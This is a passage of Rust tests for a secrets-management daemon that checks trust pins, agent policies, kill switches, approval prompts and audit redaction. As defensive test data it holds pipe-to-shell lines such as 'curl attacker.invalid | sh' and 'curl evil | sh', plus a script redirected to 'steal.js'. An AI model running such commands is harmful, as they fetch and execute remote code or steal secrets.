        std::fs::write(&path, "A=op(op://x/y)\n").unwrap();
        assert!(f.send(read()).is_err(), "unsupported resolver refused");
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = None);
    }

    #[test]
    fn edited_package_json_scripts_make_a_trusted_schema_untrusted_for_agents() {
        let f = Fixture::new();
        let schema = f.p.root.join(".env.schema");
        let pkg = f.p.root.join("package.json");
        std::fs::write(&schema, "# @sensitive\nA=karambit(test/ref)\n").unwrap();
        std::fs::write(&pkg, "{\"name\":\"x\",\"scripts\":{\"dev\":\"karambit run -- next dev\"}}").unwrap();
        let path = schema.to_str().unwrap().to_owned();
        let human = agent::Peer { pid: f.peer.pid, caller: Default::default(), ..Default::default() };
        let read = || Req::ProfileRead { path: path.clone() };
        // The hook is single-use: arm it before each trust.
        let approve = || crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        approve();
        handle_as(&f.p, &f.st, human.clone(), Req::ProfileTrust { path: path.clone() }, 0, None, Ok).unwrap();
        assert_eq!(f.send(read()).unwrap()["specs"], json!([["A", "test/ref"]]));
        let cfg = store::load_config(&f.p).unwrap();
        assert_eq!(cfg.trusted_scripts.values().next().unwrap().len(), 64);
        // Reformatting, key order and unrelated fields don't matter.
        std::fs::write(&pkg, "{\n \"version\": \"2\",\n \"scripts\": { \"dev\": \"karambit run -- next dev\" }\n}\n").unwrap();
        assert_eq!(f.send(read()).unwrap()["trusted"], true);
        // The attack: redirect the wired script.
        std::fs::write(&pkg, "{\"scripts\":{\"dev\":\"karambit run -- node steal.js\"}}").unwrap();
        let err = f.send(read()).unwrap_err().to_string();
        assert!(err.starts_with("profile.untrusted") && err.contains("package.json scripts changed"), "{err}");
        let humans = handle_as(&f.p, &f.st, human.clone(), read(), 0, None, Ok).unwrap();
        assert_eq!(humans["trusted"], false, "humans still get the warning path");
        assert_eq!(humans["detail"], "package.json scripts changed since trust");
        let log = crate::audit::read(&f.p, 100).unwrap();
        assert!(log.iter().any(|e| e["detail"]["reason_code"] == "profile.untrusted" && e["detail"]["detail"] == "package.json scripts changed since trust"));
        // Removing package.json is a change too; re-trusting pins the new state.
        std::fs::remove_file(&pkg).unwrap();
        assert!(f.send(read()).is_err());
        approve();
        handle_as(&f.p, &f.st, human, Req::ProfileTrust { path: path.clone() }, 0, None, Ok).unwrap();
        assert_eq!(f.send(read()).unwrap()["trusted"], true);
        assert_eq!(store::load_config(&f.p).unwrap().trusted_scripts.values().next().unwrap(), "none");
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = None);
    }

    #[test]
    fn schema_pinned_before_scripts_were_recorded_stays_trusted_without_package_json() {
        let f = Fixture::new();
        let schema = f.p.root.join(".env.schema");
        std::fs::write(&schema, "A=karambit(test/ref)\n").unwrap();
        let path = schema.to_str().unwrap().to_owned();
        let sha = crate::sso::sha256_hex(&std::fs::read(&schema).unwrap());
        let mut cfg = store::load_config(&f.p).unwrap();
        cfg.trusted_profiles.insert(std::fs::canonicalize(&schema).unwrap().to_str().unwrap().to_owned(), sha);
        store::save_config(&f.p, &cfg).unwrap();
        assert!(!std::fs::read_to_string(f.p.root.join("config.json")).unwrap().contains("trusted_scripts"), "old files stay readable by older builds");
        assert_eq!(f.send(Req::ProfileRead { path: path.clone() }).unwrap()["trusted"], true, "no package.json: old pin still holds");
        std::fs::write(f.p.root.join("package.json"), "{\"scripts\":{\"dev\":\"x\"}}").unwrap();
        let err = f.send(Req::ProfileRead { path }).unwrap_err().to_string();
        assert!(err.contains("package.json scripts"), "an unpinned package.json is not silently trusted: {err}");
    }

    #[test]
    fn profile_trust_smoke_and_edited_profile_refused_for_agents() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let f = Fixture::new();
        let path = f.p.root.join(".karambit.env");
        std::fs::write(&path, "A=test/ref\n").unwrap();
        let path = path.to_str().unwrap().to_owned();
        let human = agent::Peer { pid: f.peer.pid, caller: Default::default(), ..Default::default() };
        let read = || Req::ProfileRead { path: path.clone() };
        assert_eq!(f.send(read()).unwrap_err().to_string(), "profile.untrusted");
        assert_eq!(handle_as(&f.p, &f.st, human.clone(), read(), 0, None, Ok).unwrap()["trusted"], false);
        let count = Arc::new(AtomicUsize::new(0));
        let calls = count.clone();
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { calls.fetch_add(1, Ordering::SeqCst); Ok(()) })));
        handle_as(&f.p, &f.st, human, Req::ProfileTrust { path: path.clone() }, 0, None, Ok).unwrap();
        assert_eq!(count.load(Ordering::SeqCst), 1);
        assert_eq!(f.send(read()).unwrap()["specs"], json!([["A", "test/ref"]]));
        let cfg = store::load_config(&f.p).unwrap();
        assert_eq!(cfg.trusted_profiles.len(), 1);
        assert_eq!(cfg.trusted_profiles.values().next().unwrap().len(), 64);
        std::fs::write(&path, "A=test/other\n").unwrap();
        assert_eq!(f.send(read()).unwrap_err().to_string(), "profile.untrusted");
        assert!(crate::audit::read(&f.p, 100).unwrap().iter().any(|e| e["detail"]["reason_code"] == "profile.untrusted"));
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = None);
    }

    #[test]
    fn spoofed_session_label_grants_nothing() {
        let mut f = Fixture::new();
        f.peer.caller.session = Some("pid:123@456".into());
        f.peer.caller.session_label = Some("pi:trusted-human".into());
        assert!(!Grantee::Session("pi:trusted-human".into()).covers(&f.peer.caller));
        f.policy(store::Tier::Bio, false, false);
        f.st.lock().unwrap().leases.clear();
        assert!(f.send(f.req()).is_err(), "audit label cannot authorize a human-only secret");
        let raw = f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap();
        assert!(raw["deks"].as_object().unwrap().is_empty());
        let events = crate::audit::read(&f.p, 100).unwrap();
        assert!(events.iter().any(|e| e["session_label"] == "pi:trusted-human" && e["session"] == "pid:123@456"));
    }

    #[test]
    fn policy_smoke_allow_read_deny_deploy_tool() {
        let f = Fixture::new();
        f.policy(store::Tier::Open, true, true);
        set_policy(&f, json!([
            {"subject":{"secret":"test/*"},"action":"get","who":"agent","effect":"allow"},
            {"subject":{"tool":"deploy"},"action":"call","who":"agent","effect":"deny"}
        ]), json!({}));
        legacy_software_proof(&f);
        let value = f.send(legacy_unlock_req("test/ref", UnlockAction::Get, false)).unwrap();
        assert_eq!(B64.decode(value["values"][0]["value"].as_str().unwrap()).unwrap().as_slice(), test_value().as_slice());
        assert_eq!(f.send(Req::Call { tool: "deploy".into(), args: Default::default() }).unwrap_err().to_string(), "policy.rule_deny");
        assert!(crate::audit::read(&f.p, 100).unwrap().iter().any(|e| e["detail"]["reason_code"] == "policy.rule_allow"));
    }

    #[test]
    fn approval_run_set_smoke_one_prompt() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let f = Fixture::redeem();
        let v = peer_vault(&f.p, &f.peer).unwrap();
        let dek = crate::crypto::new_dek();
        let file = v.build_file("test/second", store::Tier::Bio, false, false, &dek, &test_value(), &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&f.p, &file).unwrap();
        {
            let mut g = f.st.lock().unwrap();
            let first = &g.leases["test/ref"];
            let held = Held { info: first.info.clone(), dek, root: first.root, scope: first.scope.clone(), uses: 0 };
            g.leases.insert("test/second".into(), held);
        }
        set_policy(&f, json!([{ "subject":{"secret":"test/*"},"action":"run","who":"agent","effect":"approve"}]), json!({}));
        let mut req = f.req();
        if let Req::LaunchPrepare { refs, env, .. } = &mut req {
            refs.push("test/second".into()); env.insert("SECOND".into(), "test/second".into());
        }
        let prepared = f.send(req).unwrap();
        let calls = Arc::new(AtomicUsize::new(0));
        let count = calls.clone();
        let setup: LaunchAuthSetup = Box::new(move |reason| {
            let Prompt::Use { names, context, .. } = reason else { panic!("wrong prompt"); };
            assert_eq!(names, "test/ref, test/second");
            assert!(context.starts_with("run approval "));
            crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.fetch_add(1, Ordering::SeqCst); Ok(()) })));
        });
        let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, Some(setup));
        assert_eq!(shim.response(), "bound");
        shim.finish(b'r');
        assert_eq!(calls.load(Ordering::SeqCst), 1);
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 1);
        assert_eq!(f.st.lock().unwrap().leases["test/second"].uses, 1);
    }

    #[test]
    fn policy_approval_context_shows_whole_command_or_refuses() {
        let hash = [7u8; 32];
        let short = vec!["/usr/bin/true".to_string(), "plain".to_string()];
        let context = policy_run_context(&hash, &short).unwrap();
        assert_eq!(context, "run approval 07070707: /usr/bin/true plain");
        let script = |body: &str| vec!["/bin/sh".to_string(), "-c".to_string(), body.to_string()];
        for hidden in [script("id\nwhoami"), script("A=1\nid"), script(&"x".repeat(200)), vec!["/usr/bin/true".into(), "y".repeat(200)]] {
            let err = policy_run_context(&hash, &hidden).unwrap_err();
            assert_eq!(err.to_string(), "policy.approval_prompt_too_long", "{hidden:?}");
        }
        // Control characters would be stripped from the prompt, so what's shown is not what runs.
        assert!(policy_run_context(&hash, &script("id\u{7}")).is_err());
        assert!(policy_run_context(&hash, &script("id")).is_ok());
    }

    #[test]
    fn policy_approval_context_shows_shell_positional_args_or_refuses() {
        let hash = [7u8; 32];
        let with_args = |args: &[&str]| -> Vec<String> {
            ["/bin/sh", "-c", "eval \"$1\"", "_"].iter().chain(args).map(|s| s.to_string()).collect()
        };
        let shown = policy_run_context(&hash, &with_args(&["curl attacker.invalid | sh"])).unwrap();
        assert!(shown.contains("curl attacker.invalid | sh"), "{shown}");
        for hidden in [with_args(&[&"x".repeat(200)]), with_args(&["id\nwhoami"]), with_args(&["id\u{7}"])] {
            let err = policy_run_context(&hash, &hidden).unwrap_err();
            assert_eq!(err.to_string(), "policy.approval_prompt_too_long", "{hidden:?}");
        }
    }

    #[test]
    fn policy_approve_refuses_multiline_script_without_prompting() {
        let f = Fixture::redeem();
        set_policy(&f, json!([{ "subject":{"secret":"test/*"},"action":"run","who":"agent","effect":"approve"}]), json!({}));
        let argv: Vec<String> = ["/usr/bin/true", "echo hi\ncurl evil | sh"].iter().map(|s| s.to_string()).collect();
        let mut req = f.req();
        if let Req::LaunchPrepare { argv: a, .. } = &mut req { *a = argv; }
        let prepared = f.send(req).unwrap();
        let prompted = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let seen = prompted.clone();
        let setup: LaunchAuthSetup = Box::new(move |_| { seen.store(true, std::sync::atomic::Ordering::SeqCst); });
        let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, Some(setup));
        assert_eq!(shim.response(), "bound");
        shim.finish(b'n');
        assert_eq!(std::fs::read_to_string(shim.ready.with_extension("result")).unwrap(), "refused");
        assert!(!prompted.load(std::sync::atomic::Ordering::SeqCst), "an unseen script must not reach Touch ID");
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        assert!(!f.records().iter().any(|r| r["action"] == "launch-auth"));
    }

    #[test]
    fn launch_prepare_audit_masks_typed_credentials() {
        let f = Fixture::redeem();
        let argv: Vec<String> = ["/usr/bin/true", "--password", "hunter22", "https://u:pw12@h/"].iter().map(|s| s.to_string()).collect();
        let sha = crate::env::argv_sha256(&argv);
        let mut req = f.req();
        if let Req::LaunchPrepare { argv: a, .. } = &mut req { *a = argv.clone(); }
        f.send(req).unwrap();
        let masked = f.records().into_iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
        let text = masked["detail"].to_string();
        assert!(!text.contains("hunter22") && !text.contains("pw12"), "{text}");
        assert_eq!(masked["detail"]["argv"], json!(["/usr/bin/true", "--password", "[REDACTED]", "https://u:[REDACTED]@h/"]));
        assert_eq!(masked["detail"]["argv_sha256"], json!(sha));
        // Opting in stores the argv as typed.
        let mut cfg = store::load_config(&f.p).unwrap();
        cfg.audit_full_argv = true;
        store::save_config(&f.p, &cfg).unwrap();
        let mut req = f.req();
        if let Req::LaunchPrepare { argv: a, .. } = &mut req { *a = argv.clone(); }
        f.send(req).unwrap();
        let full = f.records().into_iter().rfind(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
        assert_eq!(full["detail"]["argv"], json!(argv));
    }

    #[test]
    fn killed_agent_refused_even_with_lease() {
        let mut f = Fixture::new();
        f.peer.caller.kind = Some("pi".into());
        f.peer.caller.session = Some("pi:synthetic".into());
        for killed in [crate::policy::Killed { all: true, ..Default::default() },
            crate::policy::Killed { agents: ["pi".into()].into(), ..Default::default() },
            crate::policy::Killed { sessions: ["pi:synthetic".into()].into(), ..Default::default() }] {
            let mut cfg = store::load_config(&f.p).unwrap();
            cfg.killed = Some(killed);
            store::save_config(&f.p, &cfg).unwrap();
            assert_eq!(f.send(f.req()).unwrap_err().to_string(), "policy.killed");
            assert_eq!(f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap_err().to_string(), "policy.killed");
            assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        }
        let human = agent::Peer { pid: f.peer.pid, caller: Default::default(), ..Default::default() };
        for revive in [false, true] {
            crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
            handle_as(&f.p, &f.st, human.clone(), Req::Kill { agent: None, session: None, all: true, revive }, 0, None, Ok).unwrap();
            assert_eq!(store::load_config(&f.p).unwrap().killed.unwrap().all, !revive);
            assert_eq!(f.st.lock().unwrap().killed.all, !revive);
        }
        assert!(f.st.lock().unwrap().leases.is_empty(), "revive must not restore grants");
    }

    #[test]
    fn policy_deny_beats_allow() {
        let f = Fixture::new();
        for effects in [["allow", "deny"], ["deny", "allow"]] {
            let rules: Vec<_> = effects.iter().map(|effect| json!({"subject":{"secret":"test/*"},"action":"run","who":"agent","effect":effect})).collect();
            set_policy(&f, json!(rules), json!({}));
            assert_eq!(f.send(f.req()).unwrap_err().to_string(), "policy.rule_deny");
            assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        }
    }

    /// Replace test/ref with a secret of `len` bytes, keeping the lease's DEK in step.
    fn big_secret(f: &Fixture, len: usize) {
        let dek = big_secret_file(f, len);
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().dek = dek;
    }

    fn big_secret_file(f: &Fixture, len: usize) -> crate::crypto::Dek {
        let v = peer_vault(&f.p, &f.peer).unwrap();
        let dek = crate::crypto::new_dek();
        let secret = v.build_file("test/ref", store::Tier::Bio, false, false, &dek, &vec![b'a'; len], &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&f.p, &secret).unwrap();
        dek
    }

    /// Nothing was prompted, no lease use was spent, and no launch is waiting.
    fn assert_nothing_spent(f: &Fixture) {
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        assert!(f.st.lock().unwrap().pending_launches.is_empty());
        let audited = f.p.audit().exists() && f.records().iter().any(|r| r["action"] == "launch-prepare");
        assert!(!audited, "refused before the prepare intent");
    }

    #[test]
    fn prepare_refuses_an_oversized_env_before_any_lease_is_spent() {
        let f = Fixture::redeem();
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("prompted for a launch that cannot fit"))));
        // Over the 1 MB launch frame.
        big_secret(&f, 1100 * 1024);
        let error = f.send(f.req()).unwrap_err().to_string();
        assert!(error.starts_with(LAUNCH_TOO_LARGE) && error.contains("nothing was prompted or used"), "{error}");
        assert_nothing_spent(&f);
        // Under the frame limit but over what exec accepts together with the argv: the macOS ARG_MAX case.
        big_secret(&f, 900 * 1024);
        let mut req = f.req();
        if let Req::LaunchPrepare { argv, .. } = &mut req { argv.extend(["-n".into(), "x".repeat(200 * 1024)]); }
        let error = f.send(req).unwrap_err().to_string();
        assert!(error.starts_with(LAUNCH_TOO_LARGE) && error.contains("ARG_MAX"), "{error}");
        assert_nothing_spent(&f);
        // The owner's own environment counts too.
        big_secret(&f, 400 * 1024);
        let mut req = f.req();
        if let Req::LaunchPrepare { ambient_bytes, .. } = &mut req { *ambient_bytes = exec_arg_max() as u64; }
        assert!(f.send(req).unwrap_err().to_string().contains("ARG_MAX"));
        assert_nothing_spent(&f);
        // A caller with no authority gets the opaque refusal, never a size answer.
        let held = f.st.lock().unwrap().leases.remove("test/ref").unwrap();
        big_secret_file(&f, 1100 * 1024);
        assert_eq!(f.send(f.req()).unwrap_err().to_string(), "launch refused");
        f.st.lock().unwrap().leases.insert("test/ref".into(), held);
        big_secret(&f, 400 * 1024);
        // Regression guard: a large value that fits still prepares.
        let prepared = f.send(f.req()).unwrap();
        assert!(prepared["id"].as_str().is_some());
    }

    #[test]
    fn launch_size_estimate_uses_ciphertext_and_the_given_limit() {
        let f = Fixture::redeem();
        big_secret(&f, 1000);
        let file = store::load_secret(&f.p, "test/ref").unwrap();
        // base64 of ciphertext (plaintext + 16 tag), minus the tag: never below the true size.
        assert!((1000..1000 + 3).contains(&plaintext_upper_bound(&file)), "{}", plaintext_upper_bound(&file));
        let binding = crate::launch::LaunchBinding::capture("/usr/bin/true".into(), vec!["/usr/bin/true".into()], f.p.root.clone()).unwrap();
        let env: std::collections::BTreeMap<_, _> = [("VALUE".to_string(), "test/ref".to_string())].into();
        check_launch_size(std::slice::from_ref(&file), &env, None, &binding, 0, 64 * 1024).unwrap();
        // The same launch under a tiny ARG_MAX (margin included) is refused.
        let error = check_launch_size(std::slice::from_ref(&file), &env, None, &binding, 0, EXEC_MARGIN + 900).unwrap_err().to_string();
        assert!(error.starts_with(LAUNCH_TOO_LARGE) && error.contains("ARG_MAX"), "{error}");
        // The client states ambient_bytes: u64::MAX must be "too large", not an overflow.
        for ambient in [u64::MAX, u64::MAX - 1, usize::MAX as u64] {
            let error = check_launch_size(std::slice::from_ref(&file), &env, None, &binding, ambient, 64 * 1024).unwrap_err().to_string();
            assert!(error.starts_with(LAUNCH_TOO_LARGE), "{error}");
        }
        // A source reference has no local file: unknown size, so not counted here (checked at release).
        let source: std::collections::BTreeMap<_, _> = [("VALUE".to_string(), "vault/db/password".to_string())].into();
        check_launch_size(&[], &source, None, &binding, 0, EXEC_MARGIN + 900).unwrap();
    }

    #[test]
    fn policy_prod_tag_blocks_agent_lease() {
        let f = Fixture::new();
        set_policy(&f, json!([]), json!({"test/*":"prod"}));
        assert_eq!(f.send(f.req()).unwrap_err().to_string(), "policy.prod_agent");
        assert_eq!(f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap_err().to_string(), "policy.prod_agent");
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        // Explicit allow removes only the prod default; the existing lease is still required.
        set_policy(&f, json!([{ "subject":{"secret":"test/*"},"action":"run","who":"agent","effect":"allow"}]), json!({"test/*":"prod"}));
        f.send(f.req()).unwrap();
    }

    #[test]
    fn policy_cannot_widen_human_only_secret() {
        let f = Fixture::new();
        legacy_software_proof(&f);
        f.st.lock().unwrap().leases.clear();
        set_policy(&f, json!([{ "subject":{"secret":"test/*"},"action":"run","who":"agent","effect":"allow"}]), json!({}));
        assert!(f.send(f.req()).is_err());
        assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Run, false)).is_err());
    }

    #[test]
    fn launch_remaining_never_exceeds_fractional_deadline() {
        let at = |s: u64, ms: u64| std::time::UNIX_EPOCH + Duration::from_secs(s) + Duration::from_millis(ms);
        // expiry 130, now 129.9 => 100ms left, never a rounded-up 1s.
        assert_eq!(launch_remaining(130, at(129, 900)), Some(Duration::from_millis(100)));
        assert_eq!(launch_remaining(130, at(130, 0)), None);
        assert_eq!(launch_remaining(130, at(130, 1)), None);
        assert_eq!(launch_remaining(130, at(100, 0)), Some(Duration::from_secs(30)));
    }
    impl Fixture {
        fn new() -> Self {
            let p = Paths { root: PathBuf::from("/tmp").join(format!("karambit-prepare-{:016x}", rand::random::<u64>())) };
            store::ensure_dir(&p.keys()).unwrap();
            let pid = std::process::id() as i32;
            let exe = agent::proc_exe(pid).unwrap();
            std::fs::write(p.keys().join("daemon.sha256"), crate::platform::helper::sha256_file(Path::new(&exe)).unwrap()).unwrap();
            let st = Arc::new(Ctx::new(State::default()));
            st.lock().unwrap().leases.insert("test/ref".into(), Held {
                info: LeaseInfo { name: "test/ref".into(), to: Grantee::Any, to_label: "any".into(), granted: now(), expires: now()+60, remaining: 60, by: "synthetic".into() },
                dek: crate::crypto::new_dek(), root: None, uses: 0,
                scope: Scope { cmds: vec![CommandBinding::from("/usr/bin/true").pin().unwrap()], ..Default::default() },
            });
            let peer = agent::Peer { pid, caller: agent::Caller { agent: Some("synthetic".into()), ..Default::default() }, ..Default::default() };
            let f = Self { p, st, peer, http_port: 0, sso_base: None };
            let mut cfg = store::Config::default();
            cfg.agent_process_names.push(Path::new(&exe).file_name().unwrap().to_str().unwrap().into());
            cfg.agent_env_markers.push(agent::SYNTHETIC_AGENT_MARKER.into());
            store::save_config(&f.p, &cfg).unwrap();
            use p256::elliptic_curve::sec1::ToEncodedPoint;
            let pk = B64.encode(p256::SecretKey::from_slice(&[7; 32]).unwrap().public_key().to_encoded_point(false).as_bytes());
            store::write_atomic(&f.p.pubkeys(), &serde_json::to_vec(&json!({"bio":pk,"open":pk})).unwrap()).unwrap();
            f.policy(store::Tier::Bio, false, false);
            f
        }
        fn policy(&self, tier: store::Tier, allowed: bool, public: bool) {
            let v = peer_vault(&self.p, &self.peer).unwrap();
            let dek = crate::crypto::new_dek();
            let secret = v.build_file("test/ref", tier, allowed, public, &dek, &test_value(), &v.pubkeys_local().unwrap(), None).unwrap();
            store::save_secret(&self.p, &secret).unwrap();
            if let Some(h) = self.st.lock().unwrap().leases.get_mut("test/ref") { h.dek = dek; }
        }
        fn redeem() -> Self {
            let mut f = Self::new();
            f.peer = agent::detect_peer(&store::load_config(&f.p).unwrap(), std::process::id() as i32);
            assert!(f.peer.caller.is_agent());
            f
        }
        fn human_cached() -> Self {
            let mut f = Self::redeem();
            let mut cfg = store::Config::default();
            cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
            cfg.removed_defaults = store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| (*s).into()).collect();
            store::save_config(&f.p, &cfg).unwrap();
            f.peer = agent::detect_peer(&cfg, f.peer.pid);
            assert!(!f.peer.caller.is_agent());
            set_test_anchor(&mut f.peer);
            let mut held = f.st.lock().unwrap().leases.remove("test/ref").unwrap();
            held.info.to = Grantee::Human;
            let (pid, start) = f.peer.human_anchor().unwrap();
            f.st.lock().unwrap().human.insert((pid, start, "test/ref".into()), held);
            let st = f.st.clone();
            crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| {
                assert!(st.try_lock().is_ok(), "State held over cache probe");
                Ok(vec![Zeroizing::new(vec![0; 32])])
            })));
            f
        }
        fn req(&self) -> Req {
            Req::LaunchPrepare { allow_hosts: vec![], jail: false, refs: vec!["test/ref".into()], env: [("VALUE".into(), "test/ref".into())].into(), target: "/usr/bin/true".into(), argv: vec!["/usr/bin/true".into()], cwd: self.p.root.clone(), aws: None, ambient_bytes: 0, no_redact: false }
        }
        fn send(&self, req: Req) -> Result<Value> { handle_as(&self.p, &self.st, self.peer.clone(), req, 0, None, Ok) }
        fn prepare(&self) -> Value { self.send(self.req()).unwrap() }
        fn records(&self) -> Vec<Value> {
            std::fs::read_to_string(self.p.audit()).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect()
        }
    }
    impl Drop for Fixture {
        fn drop(&mut self) {
            crate::audit::fail_phase(None);
            crate::platform::helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
            crate::platform::helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
            crate::platform::helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
            LAUNCH_CAPTURE_HOOK.with(|h| h.borrow_mut().take());
            let _ = std::fs::remove_dir_all(&self.p.root);
        }
    }

    fn legacy_unlock_req(name: &str, action: UnlockAction, sso: bool) -> Req {
        Req::Unlock { names: vec![name.into()], action, context: Some("karambit GUI".into()),
            cmd: Some("/usr/bin/true".into()), gate_open: false,
            sso_profile: sso.then(|| name.into()), ttl: 60 }
    }

    fn legacy_software_proof(f: &Fixture) {
        for key in ["bio.key", "open.key"] { std::fs::write(f.p.keys().join(key), b"synthetic init marker").unwrap(); }
        let st = f.st.clone();
        crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
            assert!(st.try_lock().is_ok());
            let sk = p256::SecretKey::from_slice(&[7; 32]).unwrap();
            reqs.iter().map(|(_, eph)| {
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
    }

    #[test]
    fn legacy_scoped_use_unlock_rejection_and_policy_fallback() {
        let f = Fixture::new();
        legacy_software_proof(&f);
        for action in [UnlockAction::Get, UnlockAction::Reveal, UnlockAction::Run, UnlockAction::View, UnlockAction::AwsDescribe, UnlockAction::Copy] {
            let error = f.send(legacy_unlock_req("test/ref", action, false)).unwrap_err();
            assert!(error.to_string().contains(SCOPED_LEGACY_REFUSAL), "{action:?}: {error}");
            assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
            assert!(f.st.lock().unwrap().aws.is_empty());
            assert!(f.records().iter().any(|r| r["action"] == "daemon-unlock" && r["ok"] == false && r["err"].as_str().is_some_and(|e| e.contains(SCOPED_LEGACY_REFUSAL))));
        }
        for (tier, allowed, public) in [(store::Tier::Open, false, false), (store::Tier::Open, true, false), (store::Tier::Open, false, true), (store::Tier::Bio, true, false)] {
            f.policy(tier, allowed, public);
            let response = f.send(Req::Use { names: vec!["test/ref".into()], cmd: Some("/usr/bin/true".into()) }).unwrap();
            assert!(response["deks"].as_object().unwrap().is_empty());
            assert_eq!(response["denied"]["test/ref"], SCOPED_LEGACY_REFUSAL);
            assert!(f.records().iter().any(|r| r["action"] == "daemon-use-refused" && r["ok"] == false && r["detail"]["denied"]["test/ref"] == SCOPED_LEGACY_REFUSAL));
            for action in [UnlockAction::Get, UnlockAction::Run] {
                legacy_software_proof(&f);
                let result = f.send(legacy_unlock_req("test/ref", action, false));
                assert_eq!(result.is_ok(), allowed || public, "{tier:?}/{allowed}/{public}: {result:?}");
                assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
            }
        }
        f.policy(store::Tier::Bio, false, false);
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds.clear();
        let response = f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap();
        assert!(response["deks"]["test/ref"].is_string());
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 1);
        assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Run, false)).is_ok());
        assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Get, false)).is_err(), "get still cannot spend even an unscoped lease");
        let audit = std::fs::read_to_string(f.p.audit()).unwrap();
        assert!(!audit.contains(&B64.encode(test_value())));
        assert_eq!(crate::audit::verify(&f.p).unwrap().1, None);
    }

    #[test]
    fn legacy_scoped_human_disclosures_and_cache_unchanged() {
        for tier in [store::Tier::Open, store::Tier::Bio] {
            let mut f = Fixture::new();
            f.peer = agent::Peer::default();
            f.policy(tier, false, false);
            for action in [UnlockAction::Get, UnlockAction::Reveal, UnlockAction::View, UnlockAction::Run] {
                legacy_software_proof(&f);
                assert!(f.send(legacy_unlock_req("test/ref", action, false)).is_ok());
                assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
            }
        }
        let f = Fixture::human_cached();
        for key in ["bio.key", "open.key"] { std::fs::write(f.p.keys().join(key), b"synthetic init marker").unwrap(); }
        for action in [UnlockAction::Get, UnlockAction::Reveal, UnlockAction::View, UnlockAction::Run] {
            let st = f.st.clone();
            crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| {
                assert!(st.try_lock().is_ok()); Ok(vec![])
            })));
            assert!(f.send(legacy_unlock_req("test/ref", action, false)).is_ok());
        }
        assert_eq!(f.st.lock().unwrap().human.values().next().unwrap().uses, 4);
    }

    fn legacy_sso_fixture() -> (Fixture, crate::sso::SsoReg) {
        let mut reg = static_registration();
        let (f, _) = aws_fixture(&crate::sso::entry_json(&reg.profile).unwrap());
        reg.agent_allowed = false;
        let session = crate::sso::Session {
            portal: reg.profile.portal.clone(), start_url: reg.profile.start_url.clone(), region: reg.profile.sso_region.clone(),
            client_id: "synthetic".into(), client_secret: "synthetic".into(), client_expires_at: now()+3600,
            access_token: "synthetic".into(), access_issued_at: now(), access_expires_at: now()+3600,
            refresh_token: None, signed_in_at: now(), renew_until: None,
        };
        {
            let mut g = f.st.lock().unwrap();
            g.sso.insert(session.portal.clone(), session);
            g.sso_profiles.insert(reg.name.clone(), reg.clone());
            let binding = g.binding(&reg.name).unwrap();
            g.sso_creds.insert(reg.name.clone(), SsoCreds { creds: Zeroizing::new(String::from_utf8(static_test_creds().to_json().unwrap().to_vec()).unwrap()), issued: now(), expires_at: now()+3600, binding });
        }
        legacy_software_proof(&f);
        (f, reg)
    }

    #[test]
    fn legacy_scoped_aws_and_sso_rejected() {
        let (f, reg) = legacy_sso_fixture();
        for req in [Req::AwsOpen { profile: "static".into(), creds: "synthetic".into(), ttl: 60 },
            Req::AwsOpen { profile: "aws/static".into(), creds: "synthetic".into(), ttl: 60 },
            Req::SsoOpen { name: reg.name.clone(), dek: None, ttl: 60 },
